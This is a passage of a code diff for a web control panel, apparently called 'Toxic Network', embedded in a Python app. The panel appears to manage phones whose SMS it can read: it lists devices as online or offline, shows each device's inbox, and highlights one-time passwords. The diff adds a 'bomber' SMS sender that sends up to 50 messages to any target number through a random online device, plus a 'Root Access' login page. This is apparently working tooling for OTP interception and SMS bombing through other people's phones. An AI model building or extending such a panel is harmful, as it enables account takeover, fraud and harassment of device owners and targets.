+.toggle-pwd:hover{color:#f1f5f9}
+button{width:100%;margin-top:20px;padding:16px;border-radius:12px;background:#3b82f6;color:#fff;font-weight:700;font-size:15px;cursor:pointer;transition:.2s}
+button:hover{background:#2563eb;transform:translateY(-1px);box-shadow:0 10px 15px -3px rgba(59,130,246,0.3)}
 button:active{transform:scale(.98)}
-.err{margin-top:14px;text-align:center;color:#ef4444;font-size:13px}
-.lock{text-align:center;font-size:40px;margin-bottom:12px}</style></head><body>
-<form class="box" method="POST"><div class="lock">🔐</div><h1>ADMIN PANEL</h1>
-<p class="sub">Enter admin password</p>
+.err{margin-top:16px;text-align:center;color:#ef4444;font-size:13px;padding:12px;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);border-radius:8px;font-weight:500}
+.info{margin-top:24px;text-align:center;font-size:12px;color:#64748b;font-weight:500}</style></head><body>
+<form class="box" method="POST">
+<div class="logo"><span class="logo-icon">🔒</span></div>
+<h1>Root Access</h1>
+<p class="sub">Super Master Admin Panel</p>
 <div class="pwd-wrap">
-<input type="password" id="pwd" name="password" placeholder="Admin Password" required autofocus>
-<span class="toggle-pwd" onclick="togglePwd(event)">👁️</span>
+<input type="password" id="pwd" name="password" placeholder="Enter Root Key" required autofocus>
+<span class="toggle-pwd" onclick="togglePwd(event)">👁</span>
 </div>
-<button type="submit">Admin Login</button>__ERROR__</form>
+<button type="submit">Authenticate</button>__ERROR__
+<div class="info">Protected System · Level 99</div>
+</form>
 <script>
 function togglePwd(e){
-  var i=document.getElementById('pwd');
-  var t=e.target;
+  var i=document.getElementById('pwd');var t=e.target;
   if(i.type==='password'){i.type='text';t.textContent='🙈';}
-  else{i.type='password';t.textContent='👁️';}
+  else{i.type='password';t.textContent='👁';}
 }
 </script>
 </body></html>"""
 
+# ==================== PANEL OFFLINE PAGE ====================
+PANEL_OFFLINE_HTML = """<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — OFFLINE</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta http-equiv="refresh" content="15">
+<meta name="theme-color" content="#0f172a">
+<style>""" + PREMIUM_CSS + """
+body{display:flex;align-items:center;justify-content:center;padding:24px;background:#0f172a}
+.box{width:100%;max-width:400px;background:#1e293b;border:1px solid #334155;border-radius:20px;padding:40px 28px;text-align:center;box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);animation:slideUp 0.5s ease}
+.icon{font-size:64px;margin-bottom:16px;display:block;animation:pulse 2s infinite}
+h1{color:#f1f5f9;font-size:22px;margin-bottom:12px;font-weight:800;letter-spacing:-0.5px}
+p{color:#94a3b8;font-size:14px;margin-bottom:8px;font-weight:500}
+.hint{margin-top:24px;padding:16px;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);border-radius:12px;font-size:13px;color:#f87171;font-weight:600;display:flex;align-items:center;justify-content:center;gap:8px}
+.pulse{display:inline-block;width:8px;height:8px;border-radius:50%;background:#ef4444;animation:pulse 1s infinite}</style></head><body>
+<div class="box">
+<span class="icon">🚫</span>
+<h1>Access Denied</h1>
+<p>User Panel Temporarily Offline</p>
+<p style="font-size:12px;margin-top:12px;opacity:0.8">Administrator has deactivated the panel.</p>
+<div class="hint"><span class="pulse"></span>Auto-Retry Active · 15s</div>
+</div>
+</body></html>"""
 
 # ==================== USER DASHBOARD ====================
 USER_DASHBOARD_HTML = r"""<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Alex OTP Panel</title>
+<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="theme-color" content="#7c3aed">
-<style>""" + MOBILE_CSS + r"""
-body{background:#f7f8fc;color:#1e293b;min-height:100vh;padding:0 0 40px}
-.topbar{background:#fff;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 3px rgba(0,0,0,.05);flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
-.brand{font-size:17px;font-weight:800;letter-spacing:-.5px;flex-shrink:0}
-.brand .alex{background:linear-gradient(90deg,#7c3aed,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
-.brand .panel{color:#1e293b}
-.top-actions{display:flex;align-items:center;gap:8px}
-.refresh-btn{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff;border:none;width:42px;height:42px;border-radius:50%;font-size:18px;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(124,58,237,.3);transition:.2s;padding:0}
-.refresh-btn:active{transform:scale(.9) rotate(180deg)}
-.refresh-btn.spinning{animation:spin 1s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-.conn{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:600;padding:6px 10px;border-radius:20px}
-.conn.online{color:#16a34a;background:#dcfce7}
-.conn.offline{color:#dc2626;background:#fee2e2}
-.conn.loading{color:#d97706;background:#fef3c7}
-.conn .dot{width:8px;height:8px;border-radius:50%;background:currentColor}
-.conn.online .dot{animation:pulse 1.5s infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
-.logout-btn{background:#f1f5f9;color:#ef4444;border:none;padding:10px 12px;border-radius:10px;font-size:12px;font-weight:600;text-decoration:none;min-height:42px;display:inline-flex;align-items:center}
-.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between}
-@media(min-width:640px){.nav{order:0;width:auto}}
-.nav-link{padding:10px 14px;border-radius:10px;text-decoration:none;font-size:13px;font-weight:600;color:#475569;background:#f1f5f9;transition:.2s;white-space:nowrap;min-height:44px;display:inline-flex;align-items:center}
-.nav-link:active{transform:scale(.96)}
-.nav-link.active{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
-.nav-link.otp{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534}
-.container{max-width:900px;margin:0 auto;padding:14px}
-.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
-.stat{background:#fff;border-radius:14px;padding:14px;box-shadow:0 2px 8px rgba(99,102,241,.06);transition:.3s}
-.stat.flash{background:#f0fdf4}
-.stat .label{font-size:10px;color:#94a3b8;font-weight:600;letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px}
-.stat .value{font-size:26px;font-weight:800;letter-spacing:-1px}
-.stat.total .value{color:#2563eb}
-.stat.online .value{color:#16a34a}
-.stat.offline .value{color:#dc2626}
-.stat.otp .value{color:#a855f7}
-.quick{background:#fff;border-radius:14px;padding:14px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 8px rgba(99,102,241,.06);flex-wrap:wrap;gap:10px}
-.quick .info{font-size:13px;color:#475569}
-.quick .info b{color:#1e293b;font-size:15px}
-.filter-live{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap}
-.filter-live-btn{flex:1;min-width:130px;padding:14px 12px;border-radius:12px;border:2px solid transparent;cursor:pointer;font-size:13px;font-weight:700;text-decoration:none;display:flex;align-items:center;justify-content:center;gap:6px;transition:.2s;background:none;font-family:inherit;min-height:52px}
-.filter-live-btn:active{transform:scale(.97)}
-.filter-live-btn.online{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;border-color:#86efac}
-.filter-live-btn.offline{background:linear-gradient(135deg,#fee2e2,#fecaca);color:#991b1b;border-color:#fca5a5}
-.filter-live-btn.active-filter{box-shadow:0 0 0 4px rgba(99,102,241,.3)}
-.filter-live-btn .count-badge{background:rgba(0,0,0,.15);padding:2px 8px;border-radius:10px;font-size:11px}
-.list-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;padding:0 4px;gap:8px;flex-wrap:wrap}
-.list-header h2{font-size:14px;font-weight:700;color:#334155}
-.list-header .count{font-size:12px;color:#64748b;background:#e2e8f0;padding:3px 10px;border-radius:20px;font-weight:600}
-.search-box{margin-bottom:12px}
-.search-box input{width:100%;padding:14px 16px;border-radius:12px;border:1.5px solid #e2e8f0;background:#fff;outline:none;color:#1e293b}
-.search-box input:focus{border-color:#8b5cf6}
-.num-card{background:#fff;border-radius:14px;padding:14px;margin-bottom:10px;display:flex;align-items:center;gap:12px;cursor:pointer;transition:.15s;box-shadow:0 2px 6px rgba(99,102,241,.05);min-height:70px}
-.num-card:active{transform:scale(.98);background:#fafafa}
-.num-card.offline{opacity:0.85}
-.num-icon{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0;background:linear-gradient(135deg,#dcfce7,#bbf7d0)}
-.num-icon.red{background:linear-gradient(135deg,#fee2e2,#fecaca)}
-.num-icon.gray{background:linear-gradient(135deg,#f1f5f9,#e2e8f0)}
-.num-info{flex:1;min-width:0}
-.num-title{font-size:14px;font-weight:700;color:#1e293b;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.num-title.unknown{color:#94a3b8;font-style:italic}
-.num-title .confidence-badge{font-size:10px;background:#dcfce7;color:#166534;padding:2px 6px;border-radius:8px;margin-left:4px;font-weight:700}
-.num-title .confidence-badge.low{background:#fef3c7;color:#92400e}
-.num-sub{font-size:11px;color:#94a3b8;margin-top:4px;display:flex;gap:4px;flex-wrap:wrap}
-.num-sub .pill{background:#f1f5f9;padding:2px 7px;border-radius:6px;color:#64748b;font-size:10px;font-weight:600}
-.num-sub .pill.otp{background:#ede9fe;color:#7c3aed}
-.badge-online{display:flex;align-items:center;gap:5px;font-size:11px;color:#16a34a;font-weight:600;flex-shrink:0}
-.badge-online .dot{width:8px;height:8px;border-radius:50%;background:#16a34a;box-shadow:0 0 0 3px rgba(22,163,74,.15)}
-.badge-offline{display:flex;align-items:center;gap:5px;font-size:11px;color:#dc2626;font-weight:600;flex-shrink:0}
-.badge-offline .dot{width:8px;height:8px;border-radius:50%;background:#dc2626;box-shadow:0 0 0 3px rgba(220,38,38,.15)}
-.arrow{color:#cbd5e1;font-size:20px}
-.inbox-header{background:#fff;border-radius:14px;padding:16px;margin-bottom:12px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
-.inbox-top{display:flex;align-items:center;gap:10px;margin-bottom:12px}
-.back-btn{background:#f1f5f9;border:none;width:42px;height:42px;border-radius:50%;font-size:18px;cursor:pointer;color:#475569;font-weight:600;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;flex-shrink:0;padding:0}
-.back-btn:active{transform:scale(.9)}
-.inbox-num{font-size:16px;font-weight:800;color:#1e293b}
-.inbox-num.unknown{color:#94a3b8;font-style:italic}
-.inbox-status{display:flex;align-items:center;gap:6px;font-size:12px;color:#16a34a;font-weight:600;margin-top:2px}
-.inbox-status .dot{width:8px;height:8px;border-radius:50%;background:#16a34a;box-shadow:0 0 0 4px rgba(22,163,74,.15)}
-.inbox-status.offline{color:#dc2626}
-.inbox-status.offline .dot{background:#dc2626;box-shadow:0 0 0 4px rgba(220,38,38,.15)}
-.inbox-meta{font-size:11px;color:#94a3b8;display:flex;justify-content:space-between;align-items:center;gap:8px}
-.refresh-icon{cursor:pointer;font-size:20px;color:#94a3b8;user-select:none;padding:6px;min-width:36px;min-height:36px;display:flex;align-items:center;justify-content:center}
-.refresh-icon:active{transform:scale(.9)}
-.refresh-icon.spinning{animation:spin 1s linear infinite}
-.top-number-badge{background:linear-gradient(135deg,#fef3c7,#fde68a);border:2px solid #fbbf24;border-radius:12px;padding:12px 14px;margin-bottom:12px;display:flex;align-items:center;gap:10px;font-size:13px;font-weight:700;color:#92400e;box-shadow:0 2px 8px rgba(251,191,36,.2)}
-.top-number-badge .tn-icon{font-size:22px;flex-shrink:0}
-.top-number-badge .tn-info{flex:1;min-width:0}
-.top-number-badge .tn-num{font-size:16px;font-weight:800;color:#78350f;letter-spacing:.5px;word-break:break-all}
-.top-number-badge .tn-count{font-size:11px;color:#92400e;font-weight:600;margin-top:2px;opacity:.8}
-.top-number-badge .tn-highlight{background:#fbbf24;color:#78350f;padding:2px 8px;border-radius:8px;font-weight:800;font-size:11px}
-.sms-list{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(99,102,241,.06)}
-.sms-item{padding:16px;border-bottom:1px solid #f1f5f9;position:relative}
-.sms-item:last-child{border-bottom:none}
-.sms-item.fresh{background:linear-gradient(90deg,#f0fdf4,#fff 60%);border-left:4px solid #16a34a}
-.sms-item.otp-item{background:linear-gradient(90deg,#faf5ff,#fff 60%);border-left:4px solid #a855f7}
-.sms-item .msg-type-badge{position:absolute;top:10px;right:10px;font-size:9px;font-weight:800;padding:2px 6px;border-radius:6px;letter-spacing:.5px}
-.sms-item .msg-type-badge.otp{background:#a855f7;color:#fff}
-.sms-item .msg-type-badge.number{background:#16a34a;color:#fff}
-.sms-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;gap:8px;flex-wrap:wrap}
-.sender{font-size:12px;font-weight:800;color:#ef4444;letter-spacing:.3px;display:flex;align-items:center;flex-wrap:wrap}
-.new-badge{background:linear-gradient(135deg,#dc2626,#ef4444);color:#fff;font-size:9px;font-weight:800;padding:2px 6px;border-radius:10px;margin-left:6px;letter-spacing:.5px;animation:pulseBadge 1s infinite}
-@keyframes pulseBadge{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.1);opacity:.8}}
-.sms-time{font-size:11px;color:#94a3b8;font-weight:500;white-space:nowrap}
-.sms-time.fresh{color:#16a34a;font-weight:700}
-.time-ago{font-size:10px;color:#94a3b8;font-weight:600;margin-top:2px;text-align:right}
-.time-ago.fresh{color:#16a34a}
-.sms-body{font-size:14px;color:#334155;line-height:1.55;word-break:break-word;white-space:pre-wrap}
-.sms-body .phone-highlight{background:#fef3c7;color:#92400e;padding:1px 5px;border-radius:4px;font-weight:700;border:1px dashed #fbbf24}
-.otp-highlight{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;padding:2px 6px;border-radius:5px;font-weight:700;border:1px dashed #86efac}
-.otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:10px;padding:10px 16px;background:linear-gradient(135deg,#059669,#10b981);color:#fff;border:none;border-radius:20px;font-weight:700;font-size:12px;cursor:pointer;letter-spacing:.5px;min-height:40px}
-.otp-copy-btn:active{transform:scale(.96)}
-.empty{text-align:center;padding:50px 20px;color:#94a3b8;font-size:14px;background:#fff;border-radius:14px}
-.loading-text{text-align:center;padding:20px;color:#94a3b8;font-size:13px;background:#fff;border-radius:12px;margin-bottom:14px}
-.spinner{display:inline-block;width:16px;height:16px;border:2px solid #e2e8f0;border-top-color:#8b5cf6;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
-.progress-bar{width:100%;height:6px;background:#e2e8f0;border-radius:3px;overflow:hidden;margin-top:10px}
-.progress-fill{height:100%;background:linear-gradient(90deg,#7c3aed,#ec4899);border-radius:3px;transition:width .3s}
-.live-badge{display:inline-flex;align-items:center;gap:4px;background:#dcfce7;color:#166534;font-size:10px;font-weight:700;padding:3px 8px;border-radius:20px;margin-left:6px}
-.live-badge .dot{width:6px;height:6px;border-radius:50%;background:#16a34a;animation:pulse 1.2s infinite}
-.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#166534;color:#fff;padding:14px 24px;border-radius:12px;font-weight:600;font-size:14px;box-shadow:0 10px 30px rgba(0,0,0,.2);z-index:9999;transition:transform .3s;pointer-events:none;max-width:90vw;text-align:center}
-.toast.show{transform:translateX(-50%) translateY(0)}
-.hidden{display:none !important}
-@media(min-width:600px){.stats{grid-template-columns:repeat(4,1fr)}}</style></head><body>
+<meta name="theme-color" content="#0f172a">
+<style>""" + PREMIUM_CSS + r"""
+</style></head><body>
 
 <div class="topbar">
-<div class="brand"><span class="alex">Alex</span> <span class="panel">OTP PANEL</span></div>
+<div class="brand">☣️ Toxic<span>Net</span></div>
 <div class="top-actions">
-<button class="refresh-btn" id="refresh-btn" onclick="manualRefresh()" title="Refresh">🔄</button>
+<button class="refresh-btn" id="refresh-btn" onclick="manualRefresh()">⟳</button>
 <div class="conn loading" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
-<a href="/logout" class="logout-btn">Logout</a>
 </div>
-<div class="nav"><a href="/" class="nav-link active">📱 Numbers</a><a href="/otp" class="nav-link otp">🔐 Personal OTP</a></div>
+</div>
+
+<div class="nav">
+  <div class="nav-link active" id="tab-num" onclick="switchTab('num')">📱 Numbers</div>
+  <div class="nav-link" id="tab-sms" onclick="switchTab('sms')">💣 SMS Sender</div>
+  <a href="/otp" class="nav-link" style="text-decoration:none">🔑 Personal OTP</a>
 </div>
 
 <div class="container">
-<div id="list-view">
-<div class="stats">
-<div class="stat total" id="stat-total"><div class="label">TOTAL</div><div class="value" id="s-total">0</div></div>
-<div class="stat online" id="stat-online"><div class="label">ONLINE</div><div class="value" id="s-online">0</div></div>
-<div class="stat offline" id="stat-offline"><div class="label">OFFLINE</div><div class="value" id="s-offline">0</div></div>
-<div class="stat otp" id="stat-otp"><div class="label">OTP RATE</div><div class="value" id="s-otp">0%</div></div>
-</div>
-<div class="quick"><div class="info">📱 Numbers : <b id="q-dev">0</b></div></div>
-<div class="filter-live">
-<button class="filter-live-btn online" id="btn-online" onclick="setLocalFilter('online')">🟢 Online <span class="count-badge" id="badge-online">0</span></button>
-<button class="filter-live-btn offline" id="btn-offline" onclick="setLocalFilter('offline')">🔴 Offline <span class="count-badge" id="badge-offline">0</span></button>
-</div>
-<div id="loading-text" class="loading-text"><span class="spinner"></span><span id="loading-msg">Loading data...</span><div class="progress-bar"><div class="progress-fill" id="prog-fill" style="width:0%"></div></div></div>
-<div id="list-content" class="hidden"><div class="search-box"><input id="search-num" placeholder="🔎 Search number / device" oninput="renderNumbers()"></div><div class="list-header"><h2 id="list-title">📱 All Numbers <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span></h2><span class="count" id="num-count">0</span></div><div id="num-list"></div></div>
+
+<div id="view-num">
+  <div id="session-banner-wrap"></div>
+  
+  <div id="list-view">
+    <div class="stats">
+      <div class="stat total"><div class="label">Total</div><div class="value" id="s-total">0</div></div>
+      <div class="stat online"><div class="label">Online</div><div class="value" id="s-online">0</div></div>
+      <div class="stat offline"><div class="label">Offline</div><div class="value" id="s-offline">0</div></div>
+      <div class="stat otp">
+        <div class="label" style="margin-bottom:2px">OTP Rate</div>
+        <svg viewBox="0 0 36 36" class="circular-chart">
+          <path class="circle-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
+          <path class="circle" id="otp-circle" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
+          <text x="18" y="18" class="otp-text" id="s-otp">0%</text>
+        </svg>
+      </div>
+    </div>
+
+    <div class="filter-bar">
+      <button class="filter-btn active" id="filter-all" onclick="setFilter('all')">All</button>
+      <button class="filter-btn online-filter" id="filter-online" onclick="setFilter('online')">🟢 Online</button>
+      <button class="filter-btn offline-filter" id="filter-offline" onclick="setFilter('offline')">🔴 Offline</button>
+    </div>
+
+    <div class="search-box">
+      <input id="search-num" placeholder="Search number or device..." oninput="renderNumbers()">
+    </div>
+
+    <div id="loading-text" style="text-align:center;padding:40px;color:#94a3b8;font-weight:500">
+      <span class="spinner-dark" style="display:inline-block;margin-right:8px"></span> Initializing...
+    </div>
+
+    <div id="list-content" class="hidden">
+      <div class="list-header">
+        <h2>Numbers</h2>
+        <span class="count" id="num-count">0</span>
+      </div>
+      <div id="num-list"></div>
+    </div>
+  </div>
+
+  <div id="inbox-view" class="hidden">
+    <div class="inbox-header">
+      <button class="back-btn" onclick="backToList()">←</button>
+      <div style="flex:1">
+        <div class="inbox-num" id="inbox-num">---</div>
+        <div class="inbox-status" id="inbox-status"><span class="pulse-dot"></span> <span id="inbox-status-text">Online</span></div>
+      </div>
+      <button class="icon-btn" onclick="loadInbox(true)">⟳</button>
+    </div>
+    <div id="sms-container"></div>
+  </div>
 </div>
 
-<div id="inbox-view" class="hidden">
-<div class="inbox-header">
-<div class="inbox-top"><a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a><div style="flex:1"><div class="inbox-num" id="inbox-num">+91 ------</div><div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div></div></div>
-<div class="inbox-meta"><span id="inbox-meta">⚡ LIVE · auto 1s · Latest 60 SMS</span><span class="refresh-icon" onclick="loadInbox(true)">🔄</span></div>
+<div id="view-sms" class="hidden">
+  <div class="sms-sender-box">
+    <h2>💣 SMS Sender</h2>
+    <div class="warning-box">
+      ⚠️ <b>Important:</b> Ye feature sirf un devices pe kaam karta hai jinke firmware me <code>/commands/</code> handler implement hai. Standard OTP panel apps me ye feature nahi hota.
+    </div>
+    <p id="online-dev-text">Loading device info...</p>
+
+    <div class="form-group">
+      <label>Enter Number (Target)</label>
+      <input type="tel" id="sms-target" placeholder="# Enter target number (e.g. +91 9876543210)">
+    </div>
+    <div class="form-group">
+      <label>Enter Message</label>
+      <textarea id="sms-message" placeholder="Type your message here..."></textarea>
+    </div>
+    <div class="form-group">
+      <label>Kitna bar send karna hai? (Max 50)</label>
+      <input type="number" id="sms-count" value="1" min="1" max="50">
+    </div>
+    <button class="btn btn-primary" id="bulk-send-btn" onclick="sendSms(this)">🚀 Send Message</button>
+  </div>
 </div>
-<div id="top-number-badge" class="top-number-badge hidden">
-<div class="tn-icon">🏆</div>
-<div class="tn-info">
-<div class="tn-num" id="tn-num">-</div>
-<div class="tn-count">Sabse zyada baar aaya SMS me <span class="tn-highlight" id="tn-count-badge">0 bar</span></div>
+
 </div>
+
+<!-- MODAL SEND SMS -->
+<div class="modal-overlay" id="sms-modal">
+  <div class="modal-content">
+    <h3>📩 Send Message</h3>
+    <p>Target Number:</p>
+    
+    <!-- Always visible, editable input -->
+    <div class="form-group" style="margin-bottom:12px;">
+      <input type="tel" id="modal-target-input" placeholder="# Enter target number (e.g. +91 9876543210)" style="margin-bottom:0; background:#1e293b; border:1.5px solid #3b82f6;">
+    </div>
+    
+    <textarea id="modal-message" placeholder="Type your message here..." style="min-height:120px"></textarea>
+    <div class="modal-btns">
+      <button class="btn btn-gray" onclick="closeModal()">Cancel</button>
+      <button class="btn btn-primary" id="modal-send-btn" onclick="confirmSingleSend(this)">Send Now</button>
+    </div>
+  </div>
 </div>
-<div id="sms-container"></div>
-</div>
+
+<!-- MODAL STATUS -->
+<div class="modal-overlay" id="status-modal">
+  <div class="modal-content" style="text-align:center">
+    <div id="status-icon" style="font-size:48px;margin-bottom:12px">✅</div>
+    <h3 id="status-title" style="margin-bottom:8px; color:#10b981;">Success!</h3>
+    <p id="status-desc" style="margin-bottom:24px;font-size:14px;color:#cbd5e1">Message sent successfully.</p>
+    <button class="btn btn-primary" onclick="document.getElementById('status-modal').classList.remove('show')">Tutup</button>
+  </div>
 </div>
 
 <div id="toast" class="toast"></div>
@@ -917,122 +1170,182 @@ let refreshTimer = null;
 let lastSig = '';
 let lastInboxSig = '';
 let allInboxMsgs = [];
-let localFilter = 'all';
-let lastOtpSeen = '';
-let notifPermissionAsked = false;
+let panelState = {active:true, expires_at:0, passwordless:true, bomber_active:true};
+let currentFilter = 'all';
+let modalTarget = null;
+let modalDevId = null;
+let modalFbUrl = null;
 
+const $ = id => document.getElementById(id);
 function toast(text){
-  const t = document.getElementById('toast');
-  t.textContent = text;
-  t.classList.add('show');
-  setTimeout(()=>t.classList.remove('show'), 2500);
+  const t = $('toast'); t.textContent = text; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 2500);
 }
 
-function playOtpSound(){
-  try{
-    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-    [880, 1100, 880].forEach((freq, i) => {
-      const osc = ctx.createOscillator();
-      const gain = ctx.createGain();
-      osc.connect(gain); gain.connect(ctx.destination);
-      osc.frequency.value = freq;
-      const t = ctx.currentTime + i * 0.2;
-      gain.gain.setValueAtTime(0.2, t);
-      gain.gain.exponentialRampToValueAtTime(0.001, t + 0.18);
-      osc.start(t); osc.stop(t + 0.18);
-    });
-  }catch(e){}
+function switchTab(tab){
+  ['num', 'sms'].forEach(t => {
+    $('view-' + t).classList.add('hidden');
+    $('tab-' + t).classList.remove('active');
+  });
+  $('view-' + tab).classList.remove('hidden');
+  $('tab-' + tab).classList.add('active');
+  if(tab === 'sms') updateSenderUI();
 }
 
-function askNotificationPermission(){
-  if(notifPermissionAsked) return;
-  notifPermissionAsked = true;
-  if('Notification' in window && Notification.permission === 'default'){
-    Notification.requestPermission();
+function updateSenderUI(){
+  const onlineDevs = allNumbers.filter(n => n.online === true).length;
+  $('online-dev-text').innerHTML = `<span style="color:#10b981;font-weight:700">${onlineDevs} Devices Online</span> (Pesan akan dikirim via random online device)`;
+  
+  if(!panelState.bomber_active){
+    $('bulk-send-btn').disabled = true;
+    $('bulk-send-btn').textContent = '🔒 Disabled by Admin';
+  } else {
+    $('bulk-send-btn').disabled = false;
+    $('bulk-send-btn').textContent = '🚀 Send Message';
   }
 }
 
-function showOtpNotification(otp, from, message){
-  toast('🔔 OTP: ' + otp + ' — ' + from);
-  playOtpSound();
-  if('Notification' in window && Notification.permission === 'granted'){
-    try{
-      const n = new Notification('🔔 OTP: ' + otp, {
-        body: from + '\n' + message.slice(0, 100),
-        tag: 'otp-' + otp,
-      });
-      setTimeout(()=>n.close(), 10000);
-    }catch(e){}
-  }
-  if(navigator.vibrate){
-    try{ navigator.vibrate([200, 100, 200, 100, 200]); }catch(e){}
-  }
-}
-
-async function manualRefresh(){
-  const btn = document.getElementById('refresh-btn');
-  btn.classList.add('spinning');
-  toast('🔄 Refreshing...');
-  try{
-    const r = await fetch('/api/refresh', {method: 'POST'});
-    const d = await r.json();
-    if(d.success){
-      setTimeout(()=>loadNumbers(), 800);
-      toast('✅ Refresh triggered');
-    } else {
-      toast('❌ ' + (d.error || 'Refresh failed'));
-    }
-  }catch(e){
-    toast('❌ Network error');
-  }
-  setTimeout(()=>btn.classList.remove('spinning'), 1500);
-}
-
-function setLocalFilter(f){
-  if(localFilter === f){ localFilter = 'all'; }
-  else { localFilter = f; }
-  updateFilterButtons();
-  applyLocalFilter();
+function setFilter(filter){
+  currentFilter = filter;
+  ['all', 'online', 'offline'].forEach(f => $('filter-' + f).classList.remove('active'));
+  $('filter-' + filter).classList.add('active');
   renderNumbers();
 }
 
-function updateFilterButtons(){
-  document.getElementById('btn-online').classList.toggle('active-filter', localFilter === 'online');
-  document.getElementById('btn-offline').classList.toggle('active-filter', localFilter === 'offline');
-  let titleText = '📱 All Numbers';
-  if(localFilter === 'online') titleText = '🟢 Online Numbers';
-  else if(localFilter === 'offline') titleText = '🔴 Offline Numbers';
-  document.getElementById('list-title').innerHTML = titleText + ' <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span>';
+function showStatusModal(isOk, title, desc){
+  $('status-icon').textContent = isOk ? '✅' : '❌';
+  $('status-title').textContent = title;
+  $('status-title').style.color = isOk ? '#10b981' : '#ef4444';
+  $('status-desc').textContent = desc;
+  $('status-modal').classList.add('show');
 }
 
-function applyLocalFilter(){
-  if(localFilter === 'online') numbers = allNumbers.filter(n => n.online === true);
-  else if(localFilter === 'offline') numbers = allNumbers.filter(n => n.online !== true);
-  else numbers = allNumbers.slice();
-  document.getElementById('num-count').textContent = numbers.length;
+function sendSms(btn){
+  if(!panelState.bomber_active){ toast('❌ SMS Sender disabled by Admin'); return; }
+  
+  const target = $('sms-target').value.trim();
+  const msg = $('sms-message').value.trim();
+  const count = parseInt($('sms-count').value) || 1;
+  
+  if(!target){ toast('❌ Target required'); return; }
+  if(!msg){ toast('❌ Message required'); return; }
+  if(count > 50){ toast('❌ Max 50'); return; }
+  
+  const onlineDevs = allNumbers.filter(n => n.online === true);
+  if(onlineDevs.length === 0){ toast('❌ No online devices available'); return; }
+  const randomDev = onlineDevs[Math.floor(Math.random() * onlineDevs.length)];
+
+  const originalText = btn.innerHTML;
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner"></span> Sending...';
+
+  fetch('/api/sms/send', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ fb_url: randomDev.firebase, device_id: randomDev.device_id, target: target, message: msg, count })
+  }).then(r => r.json()).then(d => {
+    btn.disabled = false;
+    btn.innerHTML = originalText;
+    if(d.success){ 
+      showStatusModal(true, 'Berhasil!', `Berhasil mengirim ${d.count}x pesan ke ${target}`); 
+      $('sms-target').value = ''; $('sms-message').value = ''; $('sms-count').value = 1;
+    }
+    else { showStatusModal(false, 'Gagal', d.error || 'Unknown error'); }
+  }).catch(e => {
+    btn.disabled = false;
+    btn.innerHTML = originalText;
+    showStatusModal(false, 'Error', 'Network error');
+  });
+}
+
+function openSendModal(number, devId, fbUrl){
+  if(!panelState.bomber_active){ toast('❌ SMS Sender disabled by Admin'); return; }
+  
+  modalTarget = number;
+  modalDevId = devId;
+  modalFbUrl = fbUrl;
+  
+  const input = $('modal-target-input');
+  if(!(number || '').startsWith('UNKNOWN-')){
+    input.value = number;
+  } else {
+    input.value = '';
+  }
+  
+  $('modal-message').value = '';
+  $('sms-modal').classList.add('show');
+  setTimeout(() => input.focus(), 100);
+}
+
+function closeModal(){ $('sms-modal').classList.remove('show'); }
+
+function confirmSingleSend(btn){
+  const msg = $('modal-message').value.trim();
+  const finalTarget = $('modal-target-input').value.trim();
+  
+  if(!finalTarget) { toast('❌ Please enter target number'); return; }
+  if(!msg){ toast('❌ Message required'); return; }
+
